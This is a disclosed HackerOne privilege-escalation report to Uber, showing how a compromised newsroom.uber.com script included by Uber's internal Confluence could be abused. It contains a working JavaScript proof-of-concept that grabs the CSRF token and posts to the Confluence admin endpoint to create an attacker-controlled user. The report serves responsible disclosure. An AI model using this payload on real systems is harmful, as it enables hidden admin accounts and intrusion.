@@ -1,0 +1,34 @@
+ReportLink:https://hackerone.com/reports/136531
+WeaknessName:Privilege Escalation
+Reporter:https://hackerone.com/jouko
+ReportedTo:Uber(uber)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:06.06.2016 9:57:03
+
+Summary:
+
+This issue has some relevance to most of my previous submissions so I thought it's clearer if I open a new ticket about it.
+
+I understood you've intended the various *.uber.com WordPress sites to be isolated so that compromising them wouldn't impact Uber's internal network or user data. This has been the main reason why you've assessed the WP vulnerabilities as low risk. However, it looks like to me compromising the newroom.uber.com site hosted at WPEngine opens a trivial way to an attacker to compromise team.uberinternal.com too.
+
+Many (possibly most or all) pages on the said Atlassian Confluence environment refer a script hosted on newsroom.uber.com. For example on the 404 error page:
+~~~~ html
+<script src="https://newsroom.uber.com/wp-content/uploads/adrum.js"></script>
+~~~~
+An attacker exploiting a vulnerability on *newsroom* can modify the adrum.js file. I've previously demonstrated controlling files under the webroot.
+
+Any injected script would be evaluated for Uber employees logged on Confluence. For instance, this example script (tested on my local test Confluence) appended in adrum.js would create a new Confluence user with a password chosen by the attacker:
+~~~~ javascript
+(function(){
+var token=AJS.Meta.get('atl-token');
+var x=new XMLHttpRequest();
+x.open('POST','/admin/users/docreateuser.action');
+x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+x.send('atl_token='+token+'&username=attacker&fullName=foo&email=new@attacker.com&password=new&confirm=new');
+})();
+~~~~
+User management in Confluence has an additional security measure: an admin password is asked before allowing the operation. However, the injected script would attempt to create the user on every pageload, and if an administrator enters the user management legitimately any time, the request succeeds.
+
+Of course, this is merely one simple example of what the injected script could do.
